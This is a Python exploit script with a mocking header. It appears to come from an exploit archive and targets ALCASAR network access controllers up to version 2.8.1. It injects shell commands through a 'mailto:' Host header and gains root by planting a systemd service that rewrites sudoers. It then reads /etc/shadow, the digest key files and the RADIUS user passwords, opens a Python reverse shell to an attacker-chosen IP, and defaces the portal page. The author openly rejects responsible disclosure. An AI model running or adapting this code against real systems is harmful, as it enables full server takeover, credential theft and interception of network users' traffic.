# -*- coding: utf-8 -*-
#
####
#
#    ALCASAR <= 2.8.1 Remote Root Code Execution Vulnerability
#
#    Author: eF
#    Date  : 2014-09-12
#    URL   : http://www.alcasar.net/
#
#    This is not a responsible disclosure coz&#039; I have no sense of ethics and I don&#039;t give a f*ck.
#
#        db         88           ,ad8888ba,         db         ad88888ba         db         88888888ba
#       d88b        88          d8"&#039;    `"8b       d88b       d8"     "8b       d88b        88      "8b
#      d8&#039;`8b       88         d8&#039;                d8&#039;`8b      Y8,              d8&#039;`8b       88      ,8P
#     d8&#039;  `8b      88         88                d8&#039;  `8b     `Y8aaaaa,       d8&#039;  `8b      88aaaaaa8P&#039;
#    d8YaaaaY8b     88         88               d8YaaaaY8b      `"""""8b,    d8YaaaaY8b     88""""88&#039;
#   d8""""""""8b    88         Y8,             d8""""""""8b           `8b   d8""""""""8b    88    `8b
#  d8&#039;        `8b   88          Y8a.    .a8P  d8&#039;        `8b  Y8a     a8P  d8&#039;        `8b   88     `8b
# d8&#039;          `8b  88888888888  `"Y8888Y"&#039;  d8&#039;          `8b  "Y88888P"  d8&#039;          `8b  88      `8b
#
#
# ALCASAR is a free Network Access Controller which controls the Internet consultation networks.
# It authenticates, attributes and protects users&#039; access regardless their connected equipment
# (PC, smartphone, game console, etc.).
#
# I recently released an exploit for ALCASAR 2.8 (ALCASAR <= 2.8 Remote Code Execution Vulnerability Root).
# As a reminder, it was a trivial code execution via a unfiltered exec() call:
#
#   exec("grep -Re ^$pattern$ /etc/dansguardian/lists/blacklists/*/domains|cut -d&#039;/&#039; -f6", $output);
#
# A few days later, a new version corrects the vulnerability. Or maybe not...
#
#
# " A security hole has been discovered on ALCASAR V2.8 (only this version). This vulnerability allows a user "
# " connected on the LAN to retrieve a lot of data from the server. The ALCASAR team is testing few security  "
# " patches. A script that you could run on the active servers will be available on this forum ASAP. At that  "
# " time, the download version of ALCASAR will be incremented (V2.8.1) "
#
# ?!? This vulnerability allows a user connected on the LAN to *TOTALLY PWN* the server:
# Get a root shell, stop all services, sniff all connections, inject data in users&#039; sessions, sniff passwords,
# bypass firewall rules, act as another user, etc.
# This is not just a matter of "retrieving a lot of data from the server".
#
# Not to alert users of real criticality of a vulnerability is a very serious lack of security.
# Lying by saying that the vulnerability only affects version 2.8 while it also affects version 2.7 is another
# one.
#
# Now, the patch itself: it tries to correct the vulnerability by filtering the vulnerable input:
#
# $pattern = filter_var($pattern, FILTER_VALIDATE_URL) == false ? "" : $pattern;
#
# WTF?!
# First, I think that the application no longer works. By default, filter_var() is going to accept an URL
# only if its scheme is valid:
#
#   $ php -r &#039;var_dump(filter_var("www.google.com", FILTER_VALIDATE_URL));&#039;
#     bool(false)
#   $ php -r &#039;var_dump(filter_var("http://www.google.com", FILTER_VALIDATE_URL));&#039;
#     string(21) "http://www.google.com"
#
# But... we cannot put http:// in the HTTP host field, the HTTP server won&#039;t let us...
# Dev, did you try your patch?
# Instead, to execute code, it&#039;s quite easy to bypass this filtering using "mailto:email@valid.tld;cmd;"
#
# as root.
#
# The patch therefore removes openssl in the sudoers file (without changing the legitimate
# calls in the PHP code...). So let&#039;s use another method: systemctl is still callable via sudo...
#
# We can create a service with our command and start it as root:
#
# sudo systemctl link /tmp/pwn3d.service
# sudo systemctl start pwn3d.service
#
# Conclusion: triple fail.
#
# Wouldn&#039;t a "responsable de la sécurité des systèmes d&#039;information d&#039;un grand commandement" need a
# little training on secure PHP development?
#
# On ALCASAR website:
#
# "The security of the portal has been worked out like a bastion in order to resist to different
# kinds of threat"
#
# LOLZ!!! Remote Root Code Execution does not seem to be part of these "different kinds of threat".
#
# ALCASAR is not built with security in mind. Apache user can sudo, there is no chroot, no separation,
# the PHP code is dreadful, some passwords are unnecessarily stored in plaintext, the function to
# generate user password is weak, there are no system updates (kernel is out to date, from Jul 4 2013),
# etc.
#
# Development is not really open either: there is no bugtracker, no trac, no way to see what has been
# patched, etc. If the elementary rules of open source development had been met, a user could have
#
#
####
 
import sys, os, re, httplib
 
class PWN_Alcasar:
 
    def __init__(self, host):
        self.host = host
        self.root = False
 
    def exec_cmd(self, cmd, output=False):
        tag = os.urandom(4).encode(&#039;hex&#039;)
 
        cmd = &#039;bash -c "%s" 2>&1&#039; % cmd.replace(&#039;"&#039;, &#039;\\"&#039;)
        if self.root:
            cmd = &#039;sudo %s&#039; % cmd
 
        wrapper = &#039;echo %s;echo %s|base64 -d -w0|sh|base64 -w0&#039; % (tag, cmd.encode(&#039;base64&#039;).replace(&#039;\n&#039;,&#039;&#039;))
        wrapper = wrapper.replace(&#039; &#039;, &#039;${IFS}&#039;)
        headers = {
            &#039;host&#039; : &#039;mailto:eF@cosmic.nato;%s;#&#039; % wrapper
        }
 
        c = httplib.HTTPConnection(self.host)
        c.request(&#039;GET&#039;, &#039;/index.php&#039;, &#039;&#039;, headers)
        r = c.getresponse()
        data = r.read()
        c.close()
 
        m = re.search(r&#039;%s, (.*)\s</div>&#039; % tag, data)
        if m:
            data = m.group(1).decode(&#039;base64&#039;)
            if output:
                print data
            return data
        return None
 
    def read_file(self, filepath, output=True):
        return self.exec_cmd(&#039;cat "%s"&#039; % filepath, output=output)
 
    def read_passwords(self):
        self.read_file(&#039;/root/ALCASAR-passwords.txt&#039;)
        self.read_file(&#039;/etc/shadow&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_all&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_admin&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_backup&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_manager&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_admin&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_backup&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_manager&#039;)
        alcasar_mysql = self.read_file(&#039;/usr/local/sbin/alcasar-mysql.sh&#039;, output=False)
        if alcasar_mysql:
            m = re.search(r&#039;radiuspwd="(.*)"&#039;, alcasar_mysql)
            if m:
                radiuspwd = m.group(1)
                sql = &#039;SELECT username,value FROM radcheck WHERE attribute like \&#039;%%password%%\&#039;&#039;
                self.exec_cmd(&#039;mysql -uradius -p\"%s\" radius -e "%s"&#039; % (radiuspwd, sql), output=True)
 
    def edit_sudoers(self):
        service =  &#039;[Unit]\n&#039;
        service += &#039;Description=Just another ALCASAR lolcalr00t\n\n&#039;
        service += &#039;[Service]\n&#039;
        service += &#039;Type=forking\n&#039;
        service += &#039;KillMode=process\n&#039;
        service += &#039;ExecStart=/bin/sh -c "sed -i s/BL,NF/BL,ALL,NF/g /etc/sudoers"\n&#039;
        self.exec_cmd(&#039;echo %s | openssl base64 -d -out /tmp/Pwn3d.service -A&#039; % service.encode(&#039;base64&#039;).replace(&#039;\n&#039;, &#039;&#039;))
        self.exec_cmd(&#039;sudo systemctl link /tmp/Pwn3d.service&#039;)
        self.exec_cmd(&#039;sudo systemctl start Pwn3d.service&#039;)
        if exploit.exec_cmd(&#039;sudo id&#039;).find(&#039;uid=0&#039;) != -1:
            self.root = True
 
    def reverse_shell(self, rip, rport=&#039;80&#039;):
        payload = &#039;import socket,subprocess,os;&#039;
        payload += &#039;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&#039;
        payload += &#039;s.connect((\&#039;%s\&#039;,%s));&#039; % (rip, rport)
        payload += &#039;os.dup2(s.fileno(),0);&#039;
        payload += &#039;os.dup2(s.fileno(),1);&#039;
        payload += &#039;os.dup2(s.fileno(),2);&#039;
        payload += &#039;p=subprocess.call([\&#039;/bin/sh\&#039;,\&#039;-i\&#039;]);&#039;
        return self.exec_cmd(&#039;python -c "%s"&#039; % payload)
 
    def lolz(self):
        old = &#039;http://www.wikipedia.org&#039;
        new = &#039;https://www.youtube.com/watch\?v=Q-J0f1yF75Y&#039;
        self.exec_cmd(&#039;sed -i s,%s,%s,g /var/www/html/index.php&#039; % (old, new), True)
 
def usage():
    print &#039;Usage: %s host command (ip) (port)&#039; % sys.argv[0]
    print &#039;       "command" can be a shell command or "reverseshell"&#039;
    sys.exit(0)
  
if __name__ == &#039;__main__&#039;:
 
    print &#039;#&#039; * 80
    print &#039;# ALCASAR <= 2.8.1 Remote Root Code Execution Vulnerability&#039;
    print &#039;# Author: eF&#039;
    print &#039;#&#039; * 80
 
    if len(sys.argv) < 3:
        usage()
  
    cmd = sys.argv[2]
    if cmd == &#039;reverseshell&#039;:
        if len(sys.argv) < 5:
            print &#039;[!] Need IP and port for the reverse shell...&#039;
            sys.exit(0)
        rip = sys.argv[3]
        rport = sys.argv[4]
 
    exploit = PWN_Alcasar(sys.argv[1])
    print &#039;[-] whoami (should be apache):&#039;
    exploit.exec_cmd(&#039;id&#039;, output=True)
    print &#039;[+] On the way to the uid 0...&#039;
    exploit.edit_sudoers()
    print &#039;[-] Got root?&#039;
    exploit.exec_cmd(&#039;id&#039;, output=True)
    exploit.lolz()
    if exploit.root:
        print &#039;[+] Here are some passwords for you (again):&#039;
        exploit.read_passwords()
    if cmd == &#039;reverseshell&#039;:
        print &#039;[+] You should now have a shell on %s:%s&#039; % (rip, rport)
        exploit.reverse_shell(rip, rport)
    else:
        print &#039;[+] Your command Sir:&#039;
        exploit.exec_cmd(cmd, output=True)
    sys.exit(1)

